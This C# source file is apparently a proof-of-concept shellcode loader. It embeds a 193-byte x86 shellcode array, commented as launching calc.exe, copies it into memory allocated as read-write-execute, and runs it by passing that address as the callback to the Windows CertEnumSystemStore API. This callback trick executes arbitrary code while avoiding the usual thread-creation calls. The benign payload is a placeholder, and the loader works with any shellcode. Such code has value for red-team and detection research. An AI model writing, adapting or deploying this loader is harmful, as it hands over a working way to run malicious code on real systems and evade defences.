﻿using System;
using System.Runtime.InteropServices;

namespace CertEnumSystemStore
{
    class Program
    {
        // calc shellcode
        static byte[] op = new byte[193]
        {
            0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00,
            0x60, 0x89, 0xe5, 0x31, 0xc0, 0x64, 0x8b, 0x50, 0x30, 0x8b, 0x52, 0x0c,
            0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28, 0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff,
            0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0xc1, 0xcf, 0x0d, 0x01, 0xc7,
            0xe2, 0xf2, 0x52, 0x57, 0x8b, 0x52, 0x10, 0x8b, 0x4a, 0x3c, 0x8b, 0x4c,
            0x11, 0x78, 0xe3, 0x48, 0x01, 0xd1, 0x51, 0x8b, 0x59, 0x20, 0x01, 0xd3,
            0x8b, 0x49, 0x18, 0xe3, 0x3a, 0x49, 0x8b, 0x34, 0x8b, 0x01, 0xd6, 0x31,
            0xff, 0xac, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0x38, 0xe0, 0x75, 0xf6, 0x03,
            0x7d, 0xf8, 0x3b, 0x7d, 0x24, 0x75, 0xe4, 0x58, 0x8b, 0x58, 0x24, 0x01,
            0xd3, 0x66, 0x8b, 0x0c, 0x4b, 0x8b, 0x58, 0x1c, 0x01, 0xd3, 0x8b, 0x04,
            0x8b, 0x01, 0xd0, 0x89, 0x44, 0x24, 0x24, 0x5b, 0x5b, 0x61, 0x59, 0x5a,
            0x51, 0xff, 0xe0, 0x5f, 0x5f, 0x5a, 0x8b, 0x12, 0xeb, 0x8d, 0x5d, 0x6a,
            0x01, 0x8d, 0x85, 0xb2, 0x00, 0x00, 0x00, 0x50, 0x68, 0x31, 0x8b, 0x6f,
            0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x68, 0xa6, 0x95, 0xbd,
            0x9d, 0xff, 0xd5, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05,
            0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x53, 0xff, 0xd5, 0x63, 0x61,
            0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
        };

        static void Main()
        {
            IntPtr addr = VirtualAlloc(IntPtr.Zero, op.Length, AllocationType.Commit,
                MemoryProtection.ExecuteReadWrite);
            Marshal.Copy(op, 0, addr, op.Length);

            CertEnumSystemStore(CertSystemStoreFlags.CurrentUser, IntPtr.Zero, IntPtr.Zero, addr);
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, int dwSize, AllocationType flAllocationType,
            MemoryProtection flProtect);

        [DllImport("Crypt32.dll", SetLastError = true)]
        static extern bool CertEnumSystemStore(CertSystemStoreFlags dwFlags, IntPtr pvSystemStoreLocationPara,
            IntPtr pvReserved, IntPtr pfnEnum);

        [Flags]
        enum CertSystemStoreFlags : uint
        {
            None = 0,
            CurrentUser = 0x00010000,
            LocalMachine = 0x00020000,
            CurrentService = 0x00040000,
            Services = 0x00080000,
            Users = 0x00020000,
            GroupPolicy = 0x00040000,
            Enterprise = 0x00020000,
            EnumerateOnly = 0x00010000,
            MaximumAllowed = 0x00001000,
        }

        enum AllocationType : uint
        {
            Commit = 0x1000,
            Reserve = 0x2000,
            Decommit = 0x4000,
            Release = 0x8000,
            Reset = 0x80000,
            TopDown = 0x100000,
            WriteWatch = 0x200000,
            Physical = 0x400000,
            LargePages = 0x20000000,
        }

        enum MemoryProtection : uint
        {
            Execute = 0x10,
            ExecuteRead = 0x20,
            ExecuteReadWrite = 0x40,
            ExecuteWriteCopy = 0x80,
            NoAccess = 0x01,
            ReadOnly = 0x02,
            ReadWrite = 0x04,
            WriteCopy = 0x08,
            GuardModifierflag = 0x100,
            NoCacheModifierflag = 0x200,
            WriteCombineModifierflag = 0x400,
        }
    }
}